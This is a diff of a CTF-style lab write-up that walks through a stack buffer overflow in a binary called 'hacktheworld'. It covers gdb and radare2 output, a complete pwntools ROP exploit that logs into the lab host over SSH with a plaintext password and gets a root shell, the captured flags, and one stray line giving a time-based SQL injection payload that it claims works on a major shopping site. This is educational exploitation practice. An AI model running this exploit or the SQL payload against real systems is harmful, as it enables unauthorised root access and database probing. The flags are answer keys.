@@ -528,3 +528,269 @@ Use the vmmap instruction for a better & colored memory maps display (than the G
 gdb-peda$ pattern create 100
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 gdb-peda$ r
+Starting program: /home/witty/Downloads/hacktheworld 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Who do you want to hack? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+
+Program received signal SIGSEGV, Segmentation fault.
+Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled off'.
+
+Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled on'.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x7fffffffde68 --> 0x7fffffffe1cf ("/home/witty/Downloads/hacktheworld")
+RCX: 0x7ffff7f96a80 --> 0xfbad2288 
+RDX: 0x1 
+RSI: 0x1 
+RDI: 0x7ffff7f98a20 --> 0x0 
+RBP: 0x4141334141644141 ('AAdAA3AA')
+RSP: 0x7fffffffdd58 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+RIP: 0x40070f (<main+55>:	ret)
+R8 : 0x602715 --> 0x0 
+R9 : 0x0 
+R10: 0x1000 
+R11: 0x246 
+R12: 0x0 
+R13: 0x7fffffffde78 --> 0x7fffffffe1f2 ("TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db22c73a993ff0b42f64b396873")
+R14: 0x0 
+R15: 0x7ffff7ffd020 --> 0x7ffff7ffe2e0 --> 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400704 <main+44>:	call   0x400540 <gets@plt>
+   0x400709 <main+49>:	mov    eax,0x0
+   0x40070e <main+54>:	leave
+=> 0x40070f <main+55>:	ret
+   0x400710 <__libc_csu_init>:	push   r15
+   0x400712 <__libc_csu_init+2>:	push   r14
+   0x400714 <__libc_csu_init+4>:	mov    r15,rdx
+   0x400717 <__libc_csu_init+7>:	push   r13
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd58 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0008| 0x7fffffffdd60 ("AJAAfAA5AAKAAgAA6AAL")
+0016| 0x7fffffffdd68 ("AAKAAgAA6AAL")
+0024| 0x7fffffffdd70 --> 0x4c414136 ('6AAL')
+0032| 0x7fffffffdd78 --> 0x7fffffffde68 --> 0x7fffffffe1cf ("/home/witty/Downloads/hacktheworld")
+0040| 0x7fffffffdd80 --> 0x7fffffffde68 --> 0x7fffffffe1cf ("/home/witty/Downloads/hacktheworld")
+0048| 0x7fffffffdd88 --> 0x2ac6fdd63d3cb82a 
+0056| 0x7fffffffdd90 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x000000000040070f in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────
+ RAX  0x0
+*RBX  0x7fffffffde68 —▸ 0x7fffffffe1cf ◂— '/home/witty/Downloads/hacktheworld'
+*RCX  0x7ffff7f96a80 (_IO_2_1_stdin_) ◂— 0xfbad2288
+*RDX  0x1
+*RDI  0x7ffff7f98a20 (_IO_stdfile_0_lock) ◂— 0x0
+*RSI  0x1
+*R8   0x602715 ◂— 0x0
+ R9   0x0
+*R10  0x1000
+*R11  0x246
+ R12  0x0
+*R13  0x7fffffffde78 —▸ 0x7fffffffe1f2 ◂— 'TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db22c73a993ff0b42f64b396873'
+ R14  0x0
+*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
+*RBP  0x4141334141644141 ('AAdAA3AA')
+*RSP  0x7fffffffdd58 ◂— 'IAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+*RIP  0x40070f (main+55) ◂— ret 
+───────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────
+ ► 0x40070f <main+55>    ret    <0x4134414165414149>
+
+─────────────────────────────────────[ STACK ]─────────────────────────────────────
+00:0000│ rsp 0x7fffffffdd58 ◂— 'IAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+01:0008│     0x7fffffffdd60 ◂— 'AJAAfAA5AAKAAgAA6AAL'
+02:0010│     0x7fffffffdd68 ◂— 'AAKAAgAA6AAL'
+03:0018│     0x7fffffffdd70 ◂— 0x4c414136 /* '6AAL' */
+04:0020│     0x7fffffffdd78 —▸ 0x7fffffffde68 —▸ 0x7fffffffe1cf ◂— '/home/witty/Downloads/hacktheworld'
+05:0028│     0x7fffffffdd80 —▸ 0x7fffffffde68 —▸ 0x7fffffffe1cf ◂— '/home/witty/Downloads/hacktheworld'
+06:0030│     0x7fffffffdd88 ◂— 0x2ac6fdd63d3cb82a
+07:0038│     0x7fffffffdd90 ◂— 0x0
+───────────────────────────────────[ BACKTRACE ]───────────────────────────────────
+ ► f 0         0x40070f main+55
+   f 1 0x4134414165414149
+   f 2 0x3541416641414a41
+   f 3 0x41416741414b4141
+   f 4       0x4c414136
+   f 5   0x7fffffffde68
+   f 6   0x7fffffffde68
+   f 7 0x2ac6fdd63d3cb82a
+───────────────────────────────────────────────────────────────────────────────────
+gdb-peda$ pattern search
+Registers contain pattern buffer:
+RBP+0 found at offset: 64
+Registers point to pattern buffer:
+[RSP] --> offset 72 - size ~28
+Pattern buffer found at:
+0x006026b0 : offset    0 - size  100 ([heap])
+0x00007fffffffdd10 : offset    0 - size  100 ($sp + -0x48 [-18 dwords])
+References to pattern buffer found at:
+0x00007ffff7f96a98 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
+0x00007ffff7f96aa0 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
+0x00007ffff7f96aa8 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
+0x00007ffff7f96ab0 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
+0x00007ffff7f96ab8 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
+0x00007fffffffdae8 : 0x006026b0 ($sp + -0x270 [-156 dwords])
+0x00007fffffffd960 : 0x00007fffffffdd10 ($sp + -0x3f8 [-254 dwords])
+0x00007fffffffdc88 : 0x00007fffffffdd10 ($sp + -0xd0 [-52 dwords])
+
+Now we have the legth of the junk that we can input before we reach the RIP, that is 72 (64 + 8 of the RBP which is before of the IP). After this we can analyse the binary itself with radare2
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ r2 -d hacktheworld  
+[0x7f12a68129c0]> aaa  <---in-depth analysis
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Skipping type matching analysis in debugger mode (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x7f12a68129c0]> afl <--- list all the functionss
+0x00400570    1 43           entry0
+0x004005b0    4 42   -> 37   sym.deregister_tm_clones
+0x004005e0    4 58   -> 55   sym.register_tm_clones
+0x00400620    3 34   -> 29   sym.__do_global_dtors_aux
+0x00400650    1 7            entry.init0
+0x00400780    1 2            sym.__libc_csu_fini
+0x00400784    1 9            sym._fini
+0x00400657    1 129          sym.call_bash
+0x00400510    1 6            sym.imp.puts
+0x00400560    1 6            sym.imp.sleep
+0x00400550    1 6            sym.imp.setuid
+0x00400520    1 6            sym.imp.system
+0x00400710    4 101          sym.__libc_csu_init
+0x004005a0    1 2            sym._dl_relocate_static_pie
+0x004006d8    1 56           main
+0x00400530    1 6            sym.imp.printf
+0x00400540    1 6            sym.imp.gets
+0x004004e0    3 23           sym._init
+[0x7f12a68129c0]> s sym.call_bash <-- select
+[0x00400657]> pdf <--see
+┌ 129: sym.call_bash ();
+│           0x00400657      55             push rbp
+│           0x00400658      4889e5         mov rbp, rsp
+│           0x0040065b      488d3d360100.  lea rdi, str._nWe_are_Anonymous. ; 0x400798 ; "\nWe are Anonymous."
+│           0x00400662      e8a9feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400667      bf01000000     mov edi, 1
+│           0x0040066c      e8effeffff     call sym.imp.sleep          ; int sleep(int s)
+│           0x00400671      488d3d330100.  lea rdi, str.We_are_Legion. ; 0x4007ab ; "We are Legion."
+│           0x00400678      e893feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0040067d      bf01000000     mov edi, 1
+│           0x00400682      e8d9feffff     call sym.imp.sleep          ; int sleep(int s)
+│           0x00400687      488d3d2c0100.  lea rdi, str.We_do_not_forgive. ; 0x4007ba ; "We do not forgive."
+│           0x0040068e      e87dfeffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400693      bf01000000     mov edi, 1
+│           0x00400698      e8c3feffff     call sym.imp.sleep          ; int sleep(int s)
+│           0x0040069d      488d3d290100.  lea rdi, str.We_do_not_forget. ; 0x4007cd ; "We do not forget."
+│           0x004006a4      e867feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004006a9      bf01000000     mov edi, 1
+│           0x004006ae      e8adfeffff     call sym.imp.sleep          ; int sleep(int s)
+│           0x004006b3      488d3d260100.  lea rdi, str._Message_corrupted_...Well...done. ; 0x4007e0 ; "[Message corrupted]...Well...done."
+│           0x004006ba      e851feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004006bf      bf39050000     mov edi, 0x539              ; 1337
+│           0x004006c4      e887feffff     call sym.imp.setuid
+│           0x004006c9      488d3d330100.  lea rdi, str._bin_sh        ; 0x400803 ; "/bin/sh"
+│           0x004006d0      e84bfeffff     call sym.imp.system         ; int system(const char *string)
+│           0x004006d5      90             nop
+│           0x004006d6      5d             pop rbp
+└           0x004006d7      c3             ret
+
+0x004006bf bf39050000 mov edi, 0x539 <-- jump here 0x004006c4 e887feffff call sym.imp.setuid  
+0x004006c9 488d3d330100. lea rdi, str._bin_sh  
+0x004006d0 e84bfeffff call sym.imp.system
+
+This is the interesting part because if you jump after the mov edi, 0x539 instruciton (that set the argument 1337 for the setuid), we can simply pop the argument “0” into the RDI which store the first argument on 64 bits (if you are not familiar with 64 bits take a look at the [calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventions)). With this trick it will set the root user who is the 0 and call a bash with system that has as argument /bin/sh
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat anonymous_bof.py 
+from pwn import *
+
+remote = 1
+
+if remote:
+        ssh_session = ssh("magna","10.10.4.129",password='magnaisanelephant')
+        p = ssh_session.process('./hacktheworld')
+else:
+        p = process("./hacktheworld")
+        rop = ROP("./hacktheworld")
+        gdb.attach(p, '''
+                ''')
+rop = ROP("./hacktheworld")
+
+def main():
+        junk = b"A" * 72
+        #call_bash = p64(0x00000000004006bf) # normal bash 
+        call_bash = p64(0x00000000004006c4) # root bash 
+        null = p64(0x00)
+        pop_rdi = p64(rop.find_gadget(["pop rdi", "ret"])[0])
+
+        payload = b"".join(
+                [
+                        junk,
+                        pop_rdi,   ## Pop the first argument into the rdi
+                        null,      ## Null value for the root
+                        call_bash, ## call bash at the setuid call
+                ]
+        )
+
+        p.recvuntil(b"Who do you want to hack? ")
+        p.sendline(payload)
+        p.interactive()
+
+if __name__ == '__main__':
+        main()
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 anonymous_bof.py
+[+] Connecting to 10.10.164.142 on port 22: Done
+[*] magna@10.10.164.142:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     Enabled
+[+] Starting remote process bytearray(b'./hacktheworld') on 10.10.164.142: pid 1464
+[*] '/home/witty/Downloads/hacktheworld'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loading gadgets for '/home/witty/Downloads/hacktheworld'
+[*] Switching to interactive mode
+```
+```text
+# $ id
+uid=0(root) gid=1001(magna) groups=1001(magna)
+```
+```text
+# $ cd /root
+```
+```text
+# $ ls
+flag.txt
+```
+```text
+# $ cat flag.txt
+bc55a426e98deb673beabda50f24ce66
+
+SQL injection in one of the biggest shopping website in the world Payload: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'
+```
+User 1 Flag
+You're going to want to write a Python script for this. 'zA' = 'a'
+*9184177ecaa83073cbbf36f1414cc029*
+User 2 Flag
+*69ee352fb139c9d0699f6f399b63d9d7*
+Root Flag
+*bc55a426e98deb673beabda50f24ce66*
+
+## Notes / Lessons Learned
+[[Snapped Phishing Line]]
+
